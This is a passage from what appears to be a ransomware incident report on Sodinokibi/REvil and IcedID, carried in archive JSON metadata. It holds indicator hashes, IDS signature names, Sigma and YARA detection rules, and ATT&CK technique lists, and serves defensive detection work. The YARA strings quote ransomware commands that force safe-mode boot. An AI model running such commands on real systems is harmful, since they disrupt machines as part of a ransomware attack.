x64.dat\n5c3a6978bb960d8fbccd117ddcc3ca10\n17424cfeb756e231bea6d1363151a83af142ba6f\n59a2a5fae1c51afbbf1b8c6eb0a65cb2b8575794e3890f499f8935035e633fc\nCiocca.dll\n296f1098a3a8cfb7e07808ee08361495\n7d903f87fd305f1c93ec420848fd6e5aeb018d59\nb1b00f7b065e8c013e0c23c0f34707819e0d537dbe2e83d0d023a11a0ca6b388\nlicense.dat\n6f208841cfd819c29a7cbc0a202bd7a3\n0febc376cc066bb668f1a80b969ed112da8e871c\n45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\nDomainName.dll\nc8fab46c4fd61c5f138fb151638c35e1\nc4830cbf3a3044f6e50cd60127ff5681f8ee4bbf\n64076294e761cee0ce7d7cd28dae05f483a711eafe47f94fe881ac3980abfd8f\nDomainName.exe\naf94ccb62f97700115a219c4b7626d22\nbb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\n2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\nsvchost.exe (rclone)\nfcfcf1e45e8d5cdca0450b8dc90754b68e8e4673\n538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5\nAdFind.exe\ncb198869ca3c96af536869e71c54dd9d83afbee6\n56de41fa0a94fa7fff68f02712a698ba2f0a71afcecb217f6519bd5751baf3ed\n\n## Detections\n\n### Network\nETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2\nET DNS Query to a *.top domain\nET POLICY OpenSSL Demo CA - Internet Widgits Pty\n\n Sigma\n\n#### https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_p owershell_enc_cmd.yml\n\n https://github.com/Neo23x0/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules /windows/process_creation/win_malware_trickbot_recon_activity.yml\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_co mmands_recon_activity.yml\n\n https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/sysmon_ rundll32_net_connections.yml\n\n```\n\n-----\n\n#### https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_proces s_creation_bitsadmin_download.yml\n\n https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_a dfind.yml\n\n https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_w mi_execution.yml\n\n https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rule s/windows/process_creation/win_office_shell.yml\n\n Custom rule thanks to @0xThiebaut\n```\ntitle: Sodinokibi Ransomware Registry Key\nid: 9fecd354-77f0-498e-a611-c963970e7bca\ndescription: Detects the creation of Sodinokibi (aka REvil) registry keys\nstatus: experimental\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://twitter.com/malwrhunterteam/status/1372648463553462279\ntags:\n- attack.persistence\n- attack.t1547.001\ndate: 2021/03/29\nauthor: Maxime THIEBAUT (@0xThiebaut)\nlogsource:\ncategory: registry_event\nproduct: windows\ndetection:\nselection:\nTargetObject|contains:\n- '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca'\n- '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit'\ncondition: selection\nlevel: high\n\n Custom rule thanks to @lindodapoet_\n\n```\n\n-----\n\n```\ntitle: Svchost data exfiltration\nid: dc4249c9-d96f-401b-a92b-caa6208c097d\nstatus: experimental\ndescription: Detects possible data exfiltration via svchost\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\nauthor: Nclose\ndate: 2021/03/29\ntags:\n- attack.exfiltration\n- attack.t1048\nlogsource:\nproduct: windows\nservice: process_creation\ndetection:\nselection:\nCommandLine|contains: 'copy'\nImage|endswith: '\\svchost.exe'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n### Custom rules and rule ideas written by @BlackMatter23\n\n#### It was the most time consuming #ThreatIntel report in my careerðŸ˜¤#REvil TTPs hunting campaign is finished: â€“ 37 detection ideas\n â€“ 81 detection rules (Windows/Sysmon/EDR)\n plus BloodHound & BITS jobs:https://t.co/GoDYfvaFJF\n\n Excellent work @TheDFIRReport team!#threathunting pic.twitter.com/Tw1OyIMCki\n\n â€” Vadim Khrykov (@BlackMatter23) August 19, 2021\n\n### Yara\n\n```\n\n-----\n\n```\n/\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-03-29\nIdentifier: files\nReference: https://thedfirreport.com\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule Sodinokibi_032021 {\nmeta:\ndescription = \"files - file DomainName.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-03-21\"\nhash1 = \"2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\"\nstrings:\n$s1 = \"vmcompute.exe\" fullword wide\n$s2 = \"vmwp.exe\" fullword wide\n$s3 = \"bootcfg /raw /a /safeboot:network /id 1\" fullword ascii\n$s4 = \"bcdedit /set {current} safeboot network\" fullword ascii\n$s5 = \"[email protected]>:N:0!F$%I-6MBEFb M\" fullword ascii\n$s6 = \"jg:\\\"\\\\0=Z\" fullword ascii\n$s7 = \"ERR0R D0UBLE RUN!\" fullword wide\n$s8 = \"VVVVVPQ\" fullword ascii\n$s9 = \"VVVVVWQ\" fullword ascii\n$s10 = \"Running\" fullword wide /* Goodware String - occured 159 times */\n$s11 = \"expand 32-byte kexpand 16-byte k\" fullword ascii\n$s12 = \"9RFIT\\\"&\" fullword ascii\n$s13 = \"jZXVf9F\" fullword ascii\n$s14 = \"[email protected]\" fullword ascii\n$s15 = \"vmms.exe\" fullword wide /* Goodware String - occured 1 times */\n$s16 = \"JJwK9Zl\" fullword ascii\n$s17 = \"KkT37uf4nNh2PqUDwZqxcHUMVV3yBwSHO#K\" fullword ascii\n$s18 = \"0*090}0\" fullword ascii /* Goodware String - occured 1 times */\n$s19 = \"5)5I5a5\" fullword ascii /* Goodware String - occured 1 times */\n$s20 = \"7-7H7c7\" fullword ascii /* Goodware String - occured 1 times */\ncondition:\nuint16(0) == 0x5a4d and filesize < 400KB and\n( pe.imphash() == \"031931d2f2d921a9d906454d42f21be0\" or 8 of them )\n}\nrule icedid_032021_1 {\nmeta:\ndescription = \"files - file skull-x64.dat\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-03-21\"\nhash1 = \"59a2a5fae1c51afbbf1bf8c6eb0a65cb2b8575794e3890f499f8935035e633fc\"\nstrings:\n$s1 = \"update\" fullword ascii /* Goodware String - occured 207 times */\n$s2 = \"PstmStr\" fullword ascii\n\n```\n\n-----\n\n```\n$s3 mRsx0k/ fullword wide\n$s4 = \"D$0lzK\" fullword ascii\n$s5 = \"A;Zts}H\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 100KB and\n( pe.imphash() == \"67a065c05a359d287f1fed9e91f823d5\" and ( pe.exports(\"PstmStr\") and\npe.exports(\"update\") ) or all of them )\n}\nrule icedid_032021_2 {\nmeta:\ndescription = \"1 - file license.dat\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-03-21\"\nhash1 = \"45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\"\nstrings:\n$s1 = \"+ M:{`n-\" fullword ascii\n$s2 = \"kwzzdd\" fullword ascii\n$s3 = \"w5O- >z\" fullword ascii\n$s4 = \"[email protected]~\" fullword ascii\n$s5 = \"aQXDUkBC\" fullword ascii\n$s6 = \"}i.ZSj*\" fullword ascii\n$s7 = \"kLeSM?\" fullword ascii\n$s8 = \"qmnIqD\\\")P\" fullword ascii\n$s9 = \"aFAeU!,\" fullword ascii\n$s10 = \"Qjrf\\\"Q\" fullword ascii\n$s11 = \"PTpc,!P#\" fullword ascii\n$s12 = \"[email protected]|JZOkfmT2\" fullword ascii\n$s13 = \"aPvBO,4\" fullword ascii\n$s14 = \">fdFhl^S8Z\" fullword ascii\n$s15 = \"[syBE0\\\\\" fullword ascii\n$s16 = \"`YFOr.JH\" fullword ascii\n$s17 = \"C6ZVVF j7}\" fullword ascii\n$s18 = \"LPlagce\" fullword ascii\n$s19 = \"NLeF_-e`\" fullword ascii\n$s20 = \"HRRF|}O\" fullword ascii\ncondition:\nuint16(0) == 0x43da and filesize < 1000KB and\n8 of them\n}\n\n## MITRE\n\n```\n\n-----\n\n```\nSpearphishing Attachment T1566.001\nUser Execution - T1204\nWindows Management Instrumentation - T1047\nProcess Injection - T1055\nDomain Trust Discovery - T1482\nDomain Account - T1087.002\nSystem Information Discovery - T1082\nSystem Network Configuration Discovery - T1016\nSecurity Software Discovery - T1518.001\nSMB/Windows Admin Shares - T1021.002\nRemote Desktop Protocol - T1021.001\nCommonly Used Port - T1043\nApplication Layer Protocol - T1071\nExfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002\nData Encrypted for Impact - T1486\nMalicious File - T1204.002\nCommand and Scripting Interpreter - T1059\nPowerShell - T1059.001\nScheduled Task - T1053.005\nRemote System Discovery - T1018\nRundll32 - T1218.011\n\n#### Internal case # 1051\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-29 - Sodinokibi (aka REvil) Ransomware.pdf"
    ],
    "report_names": [
        "2021-03-29 - Sodinokibi (aka REvil) Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536175,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653761020,
    "ts_modification_date": 1653761020,
    "files": {
        "pdf": "https://archive.orkl.eu/fadc1ff58589130d2b7cc7a5ab72937451b17c59.pdf",
        "text": "https://archive.orkl.eu/fadc1ff58589130d2b7cc7a5ab72937451b17c59.txt",
        "img": "https://archive.orkl.eu/fadc1ff58589130d2b7cc7a5ab72937451b17c59.jpg"
    }
}